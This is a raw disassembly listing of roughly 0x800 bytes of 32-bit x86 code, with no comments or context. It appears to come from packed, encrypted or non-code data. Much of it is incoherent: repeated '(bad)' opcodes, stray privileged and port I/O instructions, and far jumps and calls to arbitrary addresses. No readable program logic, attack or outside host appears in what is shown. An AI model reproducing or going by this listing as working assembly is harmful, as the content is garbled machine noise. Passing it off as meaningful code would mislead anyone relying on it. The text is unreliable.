  4020e3:	enter  0x3a13,0xae
  4020e7:	lahf   
  4020e8:	mov    ebx,0x618a545e
  4020ed:	jo     0x40212e
  4020ef:	mov    al,0x13
  4020f1:	(bad)  
  4020f2:	(bad)  
  4020f4:	xchg   edx,eax
  4020f5:	mov    al,ds:0x622967f1
  4020fa:	fwait
  4020fb:	jl     0x402127
  4020fd:	pusha  
  4020fe:	or     eax,0x43162697
  402103:	(bad)  
  402104:	in     al,0x63
  402106:	sbb    al,0xeb
  402108:	in     eax,0xb3
  40210a:	and    DWORD PTR [ebx],edx
  40210c:	es cdq 
  40210e:	sbb    eax,0x9ccd3f3f
  402113:	test   DWORD PTR [ebp+0x74],0x26578037
  40211a:	and    BYTE PTR [eax+0x47],bh
  40211d:	mov    BYTE PTR [edi+ebx*8],bl
  402120:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402121:	dec    esp
  402122:	and    eax,0x1f0170c
  402127:	popa   
  402128:	or     al,0x6b
  40212a:	adc    eax,0xc5f3b6a2
  40212f:	and    al,0x65
  402131:	aaa    
  402132:	mov    BYTE PTR [edi-0x55ec8cca],cl
  402138:	add    esp,DWORD PTR [esi+0x19]
  40213b:	test   DWORD PTR [edi+0x420662b9],0xbe6566f1
  402145:	adc    dh,cl
  402147:	inc    eax
  402148:	(bad)  
  402149:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40214a:	inc    edx
  40214b:	subps  xmm6,XMMWORD PTR [esi+0x5dfbb197]
  402152:	mov    dh,0xde
  402154:	add    cx,WORD PTR [esi+eiz*1]
  402158:	(bad)  
  402159:	sub    eax,0xffc54c1a
  40215e:	dec    ebx
  40215f:	xor    eax,0x1f3ce67d
  402164:	mov    al,0xe2
  402166:	push   eax
  402167:	sbb    eax,0x3bcf57c4
  40216c:	sahf   
  40216d:	pop    es
  40216e:	jbe    0x40213e
  402170:	push   cs
  402171:	sbb    eax,0xecf9aa8b
  402176:	lock scas eax,DWORD PTR es:[edi]
  402178:	repz jns 0x4021cc
  40217b:	into   
  40217c:	mov    eax,ds:0x2f214723
  402181:	sar    ah,1
  402183:	mov    edx,0xea2345a3
  402188:	fidiv  WORD PTR ds:0x7e04679e
  40218e:	jo     0x402167
  402190:	or     BYTE PTR [esi-0x6ba4929c],cl
  402196:	xchg   ebp,eax
  402197:	add    ebx,DWORD PTR [edi+0x16eb6c0b]
  40219d:	(bad)  [edx+0x67]
  4021a0:	es stos DWORD PTR es:[edi],eax
  4021a2:	data16 and al,0x37
  4021a5:	xchg   esp,eax
  4021a6:	js     0x4021a3
  4021a8:	pop    edi
  4021a9:	retf   0x999d
  4021ac:	fistp  DWORD PTR [edx-0x4e4b2ab6]
  4021b2:	mov    ?,WORD PTR [ebx+0x2c5e4164]
  4021b8:	fsub   DWORD PTR [ecx+0x51]
  4021bb:	mov    esi,0x55fe3bc5
  4021c0:	inc    ebp
  4021c1:	inc    edi
  4021c2:	adc    al,0x2a
  4021c4:	jno    0x4021b9
  4021c6:	push   eax
  4021c7:	int3   
  4021c8:	(bad)  
  4021ca:	adc    BYTE PTR [esi+0x38],bh
  4021cd:	jo     0x402233
  4021cf:	push   0x14
  4021d1:	cmp    ch,BYTE PTR [ebp-0x11]
  4021d4:	sahf   
  4021d5:	pop    ecx
  4021d6:	loope  0x4021e4
  4021d8:	jne    0x402211
  4021da:	outs   dx,BYTE PTR ds:[esi]
  4021db:	cmp    esp,0x165df829
  4021e1:	ror    DWORD PTR [edx],0xf6
  4021e4:	shl    BYTE PTR [ebx-0x1d816e2b],0x44
  4021eb:	bound  ebx,QWORD PTR [ecx-0x36d5173f]
  4021f1:	mov    ah,0x17
  4021f3:	dec    ecx
  4021f4:	les    edx,FWORD PTR [eax-0x5e]
  4021f7:	push   edi
  4021f8:	mov    ds:0x7e4e583b,al
  4021fd:	jno    0x402253
  4021ff:	jae    0x4021a7
  402201:	gs out dx,eax
  402203:	les    esi,FWORD PTR [edx-0x18715095]
  402209:	cli    
  40220a:	cmp    eax,0x66009bec
  40220f:	mov    eax,0x3b540030
  402214:	mov    ds:0xb8f49573,eax
  402219:	xor    BYTE PTR [edx+ebx*1],bh
  40221c:	mov    ds:0x506c32c5,eax
  402221:	sbb    al,0x3d
  402223:	xchg   esp,eax
  402224:	mov    eax,0x1d53b0fc
  402229:	add    ah,al
  40222b:	mov    dl,0xaa
  40222d:	or     al,0x31
  40222f:	sti    
  402230:	enter  0xf47b,0xba
  402234:	out    dx,al
  402235:	jecxz  0x402229
  402237:	add    al,0xa7
  402239:	loope  0x4021e0
  40223b:	and    ch,BYTE PTR [esi]
  40223d:	jge    0x402224
  40223f:	pop    ds
  402240:	ins    BYTE PTR es:[edi],dx
  402241:	call   0xeb50:0xf55e4042
  402248:	xor    ecx,edx
  40224a:	scas   al,BYTE PTR es:[edi]
  40224b:	fistp  WORD PTR [ecx]
  40224d:	or     eax,0x26574581
  402252:	in     eax,dx
  402253:	nop
  402254:	shr    BYTE PTR [eax-0x7b],0xac
  402258:	cs loopne 0x4021f4
  40225b:	jno    0x402290
  40225d:	jae    0x4022dd
  40225f:	out    0xb5,eax
  402261:	jmp    0x3b43a66b
  402266:	retf   
  402267:	push   es
  402268:	shl    BYTE PTR [edi-0x8],0x8f
  40226c:	outs   dx,DWORD PTR ds:[esi]
  40226d:	jbe    0x40220c
  40226f:	add    BYTE PTR [ebp-0x27c058fe],dh
  402275:	pop    esp
  402276:	dec    edx
  402277:	pop    edx
  402278:	sbb    dh,BYTE PTR [eax-0x5d]
  40227b:	xchg   edx,eax
  40227c:	aaa    
  40227d:	int3   
  40227e:	imul   ebx,DWORD PTR [esi+0x2f],0xc70b9524
  402285:	scas   eax,DWORD PTR es:[edi]
  402286:	psubb  mm3,QWORD PTR [eax]
  402289:	in     al,0xc3
  40228b:	pop    eax
  40228c:	mov    al,0x83
  40228e:	pop    esp
  40228f:	out    0x72,eax
  402291:	and    cl,bh
  402293:	push   ebx
  402294:	scas   al,BYTE PTR es:[edi]
  402295:	mov    cl,0xd6
  402297:	arpl   WORD PTR [edx+0x4c0982f8],bx
  40229d:	pop    es
  40229e:	in     al,0x8d
  4022a0:	outs   dx,BYTE PTR ds:[esi]
  4022a1:	pop    es
  4022a2:	inc    eax
  4022a3:	out    0xc6,al
  4022a5:	cmp    ebp,esi
  4022a7:	jns    0x4022db
  4022a9:	aas    
  4022aa:	fwait
  4022ab:	adc    dh,BYTE PTR ds:0x82ee80cc
  4022b1:	mov    ch,0x6d
  4022b3:	(bad)  
  4022b4:	mov    BYTE PTR [eax+0x5b56f69],bh
  4022ba:	add    al,0x11
  4022bc:	inc    esp
  4022bd:	mov    ds:0xc15cebe9,al
  4022c2:	cmp    al,0x22
  4022c4:	jmp    0x88f19abb
  4022c9:	(bad)  
  4022ca:	shl    ebp,0x57
  4022cd:	inc    ebp
  4022ce:	mov    ebp,0xe046581e
  4022d3:	fs (bad) 
  4022d5:	sub    ebp,DWORD PTR cs:[edx-0x7d5b0f5]
  4022dc:	test   BYTE PTR [ebp-0x3a],ah
  4022df:	fmul   st,st(1)
  4022e1:	mov    ah,dl
  4022e3:	nop
  4022e4:	test   al,0x6b
  4022e7:	xor    eax,0x44d7f28b
  4022ec:	ret    
  4022ed:	mov    edx,0x9ae1c8f0
  4022f2:	aad    0x27
  4022f4:	cmp    al,0x4c
  4022f6:	pop    ds
  4022f7:	int    0x3
  4022f9:	dec    ebx
  4022fa:	cli    
  4022fb:	adc    esp,DWORD PTR [edi+0x49]
  4022fe:	jge    0x4022fd
  402300:	fwait
  402301:	and    eax,0x6309d0e6
  402306:	(bad)  
  402307:	fdivr  st(6),st
  402309:	pop    ss
  40230a:	dec    ebp
  40230b:	shl    BYTE PTR [eax+0x3e],cl
  40230e:	out    dx,al
  40230f:	sub    al,0xc7
  402311:	pop    ebx
  402312:	adc    esp,DWORD PTR [ecx+0x37]
  402315:	stc    
  402316:	les    edx,FWORD PTR [ebx+edx*1-0x39]
  40231a:	inc    ecx
  40231b:	mov    ch,0xe3
  40231d:	inc    ecx
  40231e:	loope  0x402314
  402320:	mov    eax,0x268f9814
  402325:	aas    
  402326:	popf   
  402327:	adc    BYTE PTR [ebp-0x5b],dl
  40232a:	pusha  
  40232b:	imul   edi,DWORD PTR [esi],0x4
  40232e:	cs add eax,0x7226acf3
  402334:	lahf   
  402335:	mov    cl,0xa1
  402337:	ror    BYTE PTR es:[ebx],1
  40233a:	push   ds
  40233b:	xor    BYTE PTR [esi+ebp*4-0x63dee425],bl
  402342:	adc    dh,cl
  402344:	xchg   ebx,eax
  402345:	ins    BYTE PTR es:[edi],dx
  402346:	xor    al,0x76
  402348:	out    dx,al
  402349:	cmp    al,0x74
  40234b:	fs dec ebp
  40234d:	dec    edi
  40234e:	xor    BYTE PTR ds:0xedf3252b,al
  402354:	dec    ebx
  402355:	jl     0x402317
  402357:	sbb    DWORD PTR ds:0x9ba5ba95,ebx
  40235d:	ss xchg ecx,eax
  40235f:	dec    ebp
  402360:	sbb    bh,BYTE PTR [ebx]
  402362:	(bad)  
  402363:	mov    edi,0x2e0b316e
  402368:	xchg   DWORD PTR [eax+0x758185bf],ebx
  40236e:	(bad)  
  40236f:	push   ds
  402370:	mov    BYTE PTR [eax],al
  402372:	popf   
  402373:	popf   
  402374:	xlat   BYTE PTR ds:[ebx]
  402375:	mov    ecx,0xb1501b70
  40237a:	je     0x4023d9
  40237c:	jo     0x402303
  40237e:	or     DWORD PTR [edx+0x37],esi
  402381:	add    eax,0xf7684b6b
  402386:	dec    ebx
  402387:	push   cs
  402388:	sbb    eax,0x275c14b
  40238d:	or     al,0x50
  40238f:	icebp  
  402390:	jp     0x402371
  402392:	add    al,0x78
  402394:	fs ds loop 0x4023f8
  402398:	pop    eax
  402399:	jg     0x4023ff
  40239b:	test   DWORD PTR [ebp+0x5],ebx
  40239e:	and    DWORD PTR [ebx+0xb51dc59],edx
  4023a4:	(bad)  
  4023a5:	and    edx,ebx
  4023a7:	xor    edi,DWORD PTR [esi+edi*4-0x2baf6995]
  4023ae:	shl    BYTE PTR [ebx+0x100cfa89],0xd3
  4023b5:	fcmovbe st,st(2)
  4023b7:	jo     0x402417
  4023b9:	add    edx,DWORD PTR [esi]
  4023bb:	push   ds
  4023bc:	dec    ebx
  4023bd:	(bad)  [esi-0x34]
  4023c0:	mov    bh,0x9
  4023c2:	add    al,0xe8
  4023c4:	sub    al,0xf2
  4023c6:	imul   esi,eax
  4023c9:	cmp    al,0x8f
  4023cb:	ror    BYTE PTR [edx+0x79],cl
  4023ce:	xor    esp,DWORD PTR [ebx+edx*1-0x1b41dced]
  4023d5:	cs jmp 0xb6f1e13
  4023db:	jnp    0x4023f2
  4023dd:	adc    al,0x3
  4023df:	fs mov bh,0x2a
  4023e2:	call   0xfd713add
  4023e7:	dec    ebx
  4023e8:	(bad)  
  4023e9:	push   edx
  4023ea:	sbb    eax,0xbd61a09e
  4023ef:	mov    dl,0xad
  4023f1:	cmp    ecx,DWORD PTR [eax-0x5f]
  4023f4:	ja     0x402436
  4023f6:	stos   DWORD PTR es:[edi],eax
  4023f7:	and    ah,al
  4023f9:	arpl   WORD PTR [edi],dx
  4023fb:	sbb    BYTE PTR [ebx+0x59cf1b1e],dl
  402401:	pop    edi
  402402:	fimul  WORD PTR [ecx-0x13e9f520]
  402408:	inc    esi
  402409:	imul   ebx,ebx,0xc2454ac
  40240f:	and    BYTE PTR [eax],ah
  402411:	lods   al,BYTE PTR ds:[esi]
  402412:	pop    edx
  402413:	adc    DWORD PTR [ebx+0x21679837],0xffffffa5
  40241a:	in     eax,0x71
  40241c:	dec    edi
  40241d:	sbb    eax,0x9704b756
  402422:	push   esp
  402423:	int    0xce
  402425:	cmp    al,0xfb
  402427:	push   eax
  402428:	scas   eax,DWORD PTR es:[edi]
  402429:	lea    eax,[edx+0x74]
  40242c:	mov    dh,0xbb
  40242e:	add    bl,BYTE PTR [edx-0x74]
  402431:	xor    DWORD PTR [esi],esi
  402433:	push   esp
  402434:	xchg   ebp,eax
  402435:	dec    esi
  402436:	xchg   edx,eax
  402437:	inc    ecx
  402438:	out    dx,eax
  402439:	std    
  40243a:	xor    al,0xad
  40243c:	rol    BYTE PTR [edx+0x6445933a],1
  402442:	pop    edx
  402443:	mov    edi,0x57e76b86
  402448:	pushf  
  402449:	cmc    
  40244a:	xchg   edx,eax
  40244b:	mov    ah,0xd2
  40244d:	(bad)  
  40244e:	push   es
  40244f:	sbb    ebp,esp
  402451:	in     eax,dx
  402452:	mov    BYTE PTR [esi+0x32c16c0d],ah
  402458:	imul   esp,ecx,0x7a
  40245b:	mov    edi,0x8962c716
  402460:	xchg   ecx,eax
  402461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402462:	and    eax,0x6d5735b3
  402467:	cld    
  402468:	loope  0x402406
  40246a:	inc    esi
  40246b:	stc    
  40246c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40246d:	push   es
  40246e:	popa   
  40246f:	and    eax,0x7a4d4024
  402474:	inc    esp
  402475:	and    ch,BYTE PTR [esi]
  402477:	pop    ebp
  402478:	sbb    DWORD PTR [edx],edx
  40247a:	cmp    BYTE PTR [ebx+0x76],bh
  40247d:	cmp    ch,al
  40247f:	xchg   ebx,eax
  402480:	mov    ebx,0x6f8e5b95
  402485:	ret    
  402486:	mov    dl,0x88
  402488:	adc    DWORD PTR [edx],esi
  40248a:	loop   0x40248e
  40248c:	mov    bl,0xc8
  40248e:	(bad)  
  402490:	sub    BYTE PTR [ebx+0x599c63b],ch
  402496:	cmp    edi,DWORD PTR [ebp+0x4de0b924]
  40249c:	int    0xdf
  40249e:	lods   eax,DWORD PTR ds:[esi]
  40249f:	jno    0x402465
  4024a1:	retf   0x259
  4024a4:	mov    WORD PTR [edx-0x6e2b0124],?
  4024aa:	or     al,0x10
  4024ac:	xchg   ebx,eax
  4024ad:	mov    edi,0x3428ef47
  4024b2:	pop    edi
  4024b3:	loope  0x4024d6
  4024b5:	(bad)  
  4024b7:	hlt    
  4024b8:	call   0xdbed:0x67af4a2f
  4024bf:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024c1:	jno    0x402484
  4024c3:	xor    ebx,DWORD PTR [ebp+0xc1a6bf1]
  4024c9:	sbb    ebp,DWORD PTR [ebp+0x27b63ebd]
  4024cf:	popf   
  4024d0:	and    al,BYTE PTR [ecx-0x42f234d8]
  4024d6:	mov    DWORD PTR [ebx+0x20],ebp
  4024d9:	nop
  4024da:	sub    BYTE PTR [ecx-0x80],dh
  4024dd:	mov    DWORD PTR [ecx+ebp*2+0x39],eax
  4024e1:	push   0xc873e4e9
  4024e6:	sub    cl,BYTE PTR [esp+edx*4+0x779138c7]
  4024ed:	fwait
  4024ee:	sub    ebx,DWORD PTR [ebp+0x2c9c9160]
  4024f4:	fwait
  4024f5:	sar    al,cl
  4024f7:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4024f9:	mov    ch,0x98
  4024fb:	sub    edi,0x2d
  4024fe:	sbb    eax,0xbc019550
  402503:	mov    ?,WORD PTR [edx]
  402505:	out    0x6f,al
  402507:	jmp    0x89a5:0x2661914e
  40250e:	pop    edx
  40250f:	dec    edx
  402510:	xchg   ebx,eax
  402511:	and    DWORD PTR [ecx-0x52],esi
  402514:	sbb    eax,0x43f55ce8
  402519:	mov    ebx,0x6b80fe04
  40251e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40251f:	cmp    ebp,DWORD PTR [esi+esi*1-0x20f351bf]
  402526:	mov    eax,0xd4841302
  40252b:	mov    bh,0xb5
  40252d:	xor    eax,0x7cdce385
  402532:	jl     0x402527
  402534:	fisub  DWORD PTR [ecx-0x62]
  402537:	add    eax,0x6e51b643
  40253c:	scas   al,BYTE PTR es:[edi]
  40253d:	push   edi
  40253e:	fstp   DWORD PTR [ecx]
  402540:	rol    al,1
  402542:	sbb    ah,BYTE PTR [ecx]
  402544:	(bad)  
  402545:	and    BYTE PTR [edi+0x74],ah
  402548:	cmp    bl,BYTE PTR [eax+0x55]
  40254b:	add    DWORD PTR [ebp-0x69c92c5f],ecx
  402551:	popf   
  402552:	ror    DWORD PTR [esi-0x21dd0ccc],1
  402558:	push   eax
  402559:	aad    0xf2
  40255b:	repz fdiv DWORD PTR [ebp+0x5c]
  40255f:	inc    eax
  402560:	lods   eax,DWORD PTR ds:[esi]
  402561:	mov    edx,0x8c83b4e0
  402566:	out    dx,al
  402567:	fsubr  DWORD PTR [ebp+0x1f382b71]
  40256d:	mov    dh,0x6b
  40256f:	cmp    eax,0xd395c683
  402574:	int    0xbf
  402576:	mov    WORD PTR [edx+0x215e909],ss
  40257c:	mov    edx,0x26a15c8b
  402581:	pop    edx
  402582:	mov    ds,WORD PTR [esi]
  402584:	fiadd  WORD PTR [ecx+edi*2]
  402588:	clc    
  402589:	cmp    BYTE PTR [ebx-0x1362b914],0x87
  402590:	jae    0x4025c7
  402592:	or     eax,0x9a51c0ee
  402597:	or     eax,0x93b50ca3
  40259c:	and    eax,0x7e5e3acf
  4025a1:	ins    BYTE PTR es:[edi],dx
  4025a2:	std    
  4025a3:	cmp    dl,cl
  4025a5:	xor    al,0x1d
  4025a7:	cmp    edi,DWORD PTR [ecx-0x41]
  4025aa:	dec    esi
  4025ab:	mov    BYTE PTR [esi],ch
  4025ad:	or     al,BYTE PTR [edi+edx*2]
  4025b0:	xchg   ebx,eax
  4025b1:	ror    BYTE PTR [ebx+edx*4],1
  4025b4:	inc    ecx
  4025b5:	xchg   esi,ecx
  4025b7:	test   DWORD PTR [edi],ebp
  4025b9:	mov    esi,0x7f7f0b67
  4025be:	sub    BYTE PTR [ebp+edi*1+0x3f9f71a2],dh
  4025c5:	inc    edx
  4025c6:	lods   al,BYTE PTR ds:[esi]
  4025c7:	push   ds
  4025c8:	ss add al,0x62
  4025cb:	push   ss
  4025cc:	jle    0x402636
  4025ce:	aam    0x10
  4025d0:	sbb    esp,ecx
  4025d2:	into   
  4025d3:	push   edx
  4025d4:	push   esp
  4025d5:	mov    ch,dh
  4025d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025d8:	mov    bl,0x1
  4025da:	add    ah,cl
  4025dc:	(bad)  
  4025dd:	xchg   ecx,eax
  4025de:	icebp  
  4025df:	imul   ecx,edx,0xee2110b1
  4025e5:	pop    ss
  4025e6:	sub    eax,0x8f34d44
  4025eb:	mov    eax,ds:0xf739850a
  4025f0:	int    0xcb
  4025f2:	jge    0x402650
  4025f4:	int3   
  4025f5:	in     al,dx
  4025f6:	pop    eax
  4025f7:	mov    al,ds:0x41663559
  4025fc:	jg     0x40261b
  4025fe:	adc    bh,bh
  402600:	cmp    al,0x1e
  402602:	mov    ds:0xafc07d18,al
  402607:	mov    al,ds:0x94855dba
  40260c:	gs adc bl,ch
  40260f:	loop   0x402616
  402611:	aad    0x4d
  402613:	mov    dl,0x52
  402615:	push   edx
  402616:	sub    ebx,DWORD PTR [edi-0x2e]
  402619:	jmp    0x402694
  40261b:	(bad)  
  40261c:	sbb    ch,BYTE PTR [eax+0x5533152c]
  402622:	mov    eax,0xdbea402
  402627:	mov    BYTE PTR [eax],0x15
  40262a:	addr16 xor al,0xd0
  40262d:	jp     0x4025fc
  40262f:	cs inc edi
  402631:	xor    BYTE PTR [edx],ah
  402633:	pop    es
  402634:	ja     0x4025dc
  402636:	pop    edi
  402637:	mov    DWORD PTR [edi+0x7e2e4336],esp
  40263d:	xor    al,0xbc
  40263f:	sub    ebx,ebx
  402641:	pop    edx
  402642:	or     al,BYTE PTR [ebp+0x2b]
  402645:	pushf  
  402646:	mov    cl,0x32
  402648:	pop    edi
  402649:	call   0xb05d:0xc3f6c78a
  402650:	push   ebp
  402651:	dec    eax
  402652:	scas   eax,DWORD PTR es:[edi]
  402653:	sbb    ch,BYTE PTR [edi-0x50b2dca5]
  402659:	xor    al,0xc1
  40265b:	mov    esi,0xa6cdc756
  402660:	or     al,0x70
  402662:	(bad)  
  402663:	int3   
  402664:	(bad)  
  402665:	(bad)  
  402666:	std    
  402667:	in     eax,0x7d
  402669:	div    BYTE PTR [esi+0x13]
  40266c:	and    ah,al
  40266e:	or     BYTE PTR [ecx-0x6e],cl
  402671:	cmp    al,0xf0
  402673:	gs mov edi,0x3dda1050
  402679:	or     DWORD PTR [edi-0x52],eax
  40267c:	jmp    0xa4aef87f
  402681:	ret    
  402682:	inc    esp
  402683:	mov    edx,0x9cc9b0f6
  402688:	imul   BYTE PTR [ecx+edi*4]
  40268b:	idiv   BYTE PTR [ebp-0x10]
  40268e:	scas   al,BYTE PTR es:[edi]
  40268f:	pop    ss
  402690:	pop    esi
  402691:	out    0xb5,eax
  402693:	sahf   
  402694:	dec    ebx
  402695:	xchg   esp,edx
  402697:	sbb    ah,BYTE PTR [edx]
  402699:	daa    
  40269a:	je     0x402658
  40269c:	scas   al,BYTE PTR es:[edi]
  40269d:	popf   
  40269e:	mov    ebp,DWORD PTR [esi+ecx*1]
  4026a1:	cmp    BYTE PTR [esi-0x57],cl
  4026a4:	loope  0x402723
  4026a6:	mov    al,ds:0x8f11c5c3
  4026ab:	out    0xb4,al
  4026ad:	cmc    
  4026ae:	inc    edi
  4026af:	outs   dx,BYTE PTR ds:[esi]
  4026b0:	sbb    ch,BYTE PTR [eax+0x29]
  4026b3:	(bad)  
  4026b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026b5:	pop    esp
  4026b6:	jle    0x40266c
  4026b8:	fwait
  4026b9:	stc    
  4026ba:	sub    BYTE PTR [edi-0x7f6297e0],bl
  4026c0:	adc    al,0x2f
  4026c2:	add    DWORD PTR [esi-0x113d549],esi
  4026c8:	cmp    ebp,esi
  4026ca:	loopne 0x4026c8
  4026cc:	sti    
  4026cd:	mov    ds:0x85aef1e9,eax
  4026d2:	fdivr  QWORD PTR [edi+0x16]
  4026d5:	push   ebx
  4026d6:	nop
  4026d7:	dec    edi
  4026d8:	loope  0x40266b
  4026da:	into   
  4026db:	es fs ins BYTE PTR es:[edi],dx
  4026de:	ins    DWORD PTR es:[edi],dx
  4026df:	lea    eax,[esi]
  4026e1:	add    BYTE PTR [ecx-0x13],0xc
  4026e5:	popf   
  4026e6:	xor    DWORD PTR [ebx],esi
  4026e8:	xor    al,0x8c
  4026ea:	into   
  4026eb:	into   
  4026ec:	push   edi
  4026ed:	(bad)  
  4026ee:	jge    0x4026e4
  4026f0:	xor    al,0x5f
  4026f2:	mov    dl,0xc2
  4026f4:	adc    al,0x29
  4026f6:	pushf  
  4026f7:	push   ebx
  4026f8:	push   ds
  4026f9:	xor    BYTE PTR [edi+0x5744010a],cl
  4026ff:	fist   WORD PTR [eax-0x3c]
  402702:	dec    esp
  402703:	sub    eax,0xa21c73e7
  402708:	(bad)  ds:0x7c495abc
  40270e:	cdq    
  40270f:	rcl    DWORD PTR [edi-0x4f638374],1
  402715:	add    eax,DWORD PTR [esi+edx*8-0x26]
  402719:	xchg   ecx,eax
  40271a:	mov    ebp,DWORD PTR [di]
  40271d:	adc    al,0xb6
  40271f:	sbb    DWORD PTR [esi+eax*4+0x6f],esi
  402723:	gs push ecx
  402725:	in     al,dx
  402726:	mov    edx,0xbd1cacf
  40272b:	ins    BYTE PTR es:[edi],dx
  40272c:	dec    ebp
  40272d:	pop    esi
  40272e:	pop    ss
  40272f:	rol    DWORD PTR ds:0xe687002,0xda
  402736:	cmp    DWORD PTR [ebp+0x2a7c7006],ebp
  40273c:	fstp   QWORD PTR [edx]
  40273e:	enter  0xf169,0x12
  402742:	repnz and eax,DWORD PTR [ecx+0x7be3021a]
  402749:	into   
  40274a:	sub    al,0x8c
  40274c:	xor    eax,0x94fe1b6e
  402751:	fimul  DWORD PTR [eax+eax*8+0x5]
  402755:	dec    eax
  402756:	stos   BYTE PTR es:[edi],al
  402757:	int    0xb2
  402759:	jmp    0xcae6:0x89a6b355
  402760:	xchg   esi,eax
  402761:	gs data16 clc 
  402764:	ins    DWORD PTR es:[edi],dx
  402765:	ja     0x40273a
  402767:	arpl   bx,si
  402769:	es repz dec ebx
  40276c:	or     ch,BYTE PTR [edi+edi*8+0x75b39935]
  402773:	ret    0xba0f
  402776:	push   es
  402777:	mov    dl,0x56
  402779:	(bad)  
  40277b:	jne    0x40276d
  40277d:	sub    BYTE PTR [eax],ah
  40277f:	sbb    BYTE PTR [esi],0xae
  402782:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402783:	mov    ecx,0x3ea981ca
  402788:	pop    edi
  402789:	fst    st(3)
  40278b:	in     eax,dx
  40278c:	mov    ebx,0x82150a03
  402791:	inc    ebx
  402792:	daa    
  402793:	lea    eax,[edx]
  402795:	cwde   
  402796:	xor    eax,0x60169c93
  40279b:	mov    ds:0x2431b2a7,eax
  4027a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027a1:	gs jecxz 0x40276e
  4027a4:	add    eax,0x1af7e05c
  4027a9:	mov    al,0xcc
  4027ab:	inc    DWORD PTR [ecx+0x5efb0c0d]
  4027b1:	push   ds
  4027b2:	push   0x7e
  4027b4:	pop    ebp
  4027b5:	fcmovbe st,st(5)
  4027b7:	retf   
  4027b8:	iret   
  4027b9:	shr    DWORD PTR [edx-0x45],0xb5
  4027bd:	das    
  4027be:	add    al,0xc6
  4027c0:	(bad)  
  4027c1:	(bad)  
  4027c2:	(bad)  
  4027c3:	xchg   edi,eax
  4027c4:	inc    esi
  4027c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027c6:	jnp    0x402831
  4027c8:	mov    ecx,0x30f91778
  4027cd:	(bad)  
  4027ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027cf:	shl    ecx,1
  4027d1:	pusha  
  4027d2:	sahf   
  4027d3:	inc    esp
  4027d4:	jns    0x402773
  4027d6:	iret   
  4027d7:	scas   al,BYTE PTR es:[edi]
  4027d8:	xchg   ebp,eax
  4027d9:	jnp    0x4027d6
  4027db:	push   edi
  4027dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027dd:	mov    al,0x42
  4027df:	das    
  4027e0:	cmp    al,0xf9
  4027e2:	and    cl,BYTE PTR [ebx+ebx*2+0x25169814]
  4027e9:	addr16 popa 
  4027eb:	add    al,0xa0
  4027ed:	pushf  
  4027ee:	cdq    
  4027ef:	inc    DWORD PTR [eax-0xc]
  4027f2:	add    edi,edi
  4027f4:	sbb    ecx,edi
  4027f6:	das    
  4027f7:	in     al,dx
  4027f8:	add    cl,BYTE PTR [ebx+0x3208e95c]
  4027fe:	repnz (bad) 
  402800:	sti    
  402801:	pop    ebx
  402802:	ror    BYTE PTR [ebx+esi*8+0x52a8bf6d],1
  402809:	jle    0x4027e7
  40280b:	mov    cl,0x8c
  40280d:	jmp    0x650:0xb4cfab
  402814:	loopne 0x4027d4
  402816:	mov    cl,0xb4
  402818:	push   esp
  402819:	adc    eax,0x24c985d0
  40281e:	out    0xf1,eax
  402820:	dec    edx
  402821:	add    ch,0xc5
  402824:	addr16 gs add ah,ah
  402828:	cmp    eax,0x104441f0
  40282d:	mov    al,ds:0xdd9f69a3
  402832:	stc    
  402833:	push   edi
  402834:	aad    0x1b
  402836:	jecxz  0x4027d1
  402838:	push   edi
  402839:	xor    esi,0xc3bdda05
  40283f:	outs   dx,BYTE PTR ds:[esi]
  402840:	mov    ebp,0x210ce2a4
  402845:	xlat   BYTE PTR ds:[ebx]
  402846:	pop    DWORD PTR [eax]
  402848:	fsub   st(6),st
  40284a:	fwait
  40284b:	cwde   
  40284c:	mov    ecx,0x941b878e
  402851:	aaa    
  402852:	jae    0x402857
  402854:	mov    ah,0xd6
  402856:	pushf  
  402857:	in     al,dx
  402858:	mov    ch,0x15
  40285a:	jmp    0x402845
  40285c:	or     al,0xe7
  40285e:	xchg   edi,eax
  40285f:	adc    edi,DWORD PTR [edi-0x46063394]
  402865:	ficomp DWORD PTR [esi-0x45]
  402868:	lea    ebx,[ebx]
  40286a:	test   eax,0xb43e5129
  40286f:	xor    DWORD PTR [ecx+edx*8],ebx
  402872:	outs   dx,DWORD PTR ds:[esi]
  402873:	mov    bl,0xd1
  402875:	inc    ecx
  402876:	xchg   edi,eax
  402877:	push   0x74
  402879:	lock mov esi,0x836e7e4d
  40287f:	adc    BYTE PTR [esi+0x5842a949],al
  402885:	xor    eax,0x4f4c6e52
  40288a:	jg     0x402819
  40288c:	cmp    al,0xc7
  40288e:	pop    ss
  40288f:	push   es
  402890:	or     ebp,DWORD PTR [ecx-0x21ee3b61]
  402896:	inc    eax
  402897:	mov    ah,0xde
  402899:	cmc    
  40289a:	pop    ebp
  40289b:	retf   0x4e10
  40289e:	mov    ebp,0x58d26f72
  4028a3:	sti    
  4028a4:	int3   
  4028a5:	test   eax,0x4cba00a5
  4028aa:	push   edx
  4028ab:	fdivr  DWORD PTR [esi+0x26b835eb]
  4028b1:	scas   al,BYTE PTR es:[edi]
  4028b2:	jnp    0x40287d
  4028b4:	pop    esi
  4028b5:	enter  0xc1cf,0x91
  4028b9:	ss iret 
  4028bb:	push   esp
  4028bc:	lahf   
  4028bd:	jae    0x402898
  4028bf:	xchg   edi,eax
  4028c0:	psubusb mm4,mm0
  4028c3:	les    ecx,FWORD PTR [esi+0x687d0239]
  4028c9:	ins    BYTE PTR es:[edi],dx
  4028ca:	std    
  4028cb:	leave  
  4028cc:	mov    edx,0x1ded4326
  4028d1:	ins    BYTE PTR es:[edi],dx
  4028d2:	das    
  4028d3:	lea    ebx,[ecx+ecx*8+0x1b]
  4028d7:	lds    ecx,FWORD PTR [ebx+ecx*2]
  4028da:	xchg   esp,eax
  4028db:	pop    ss
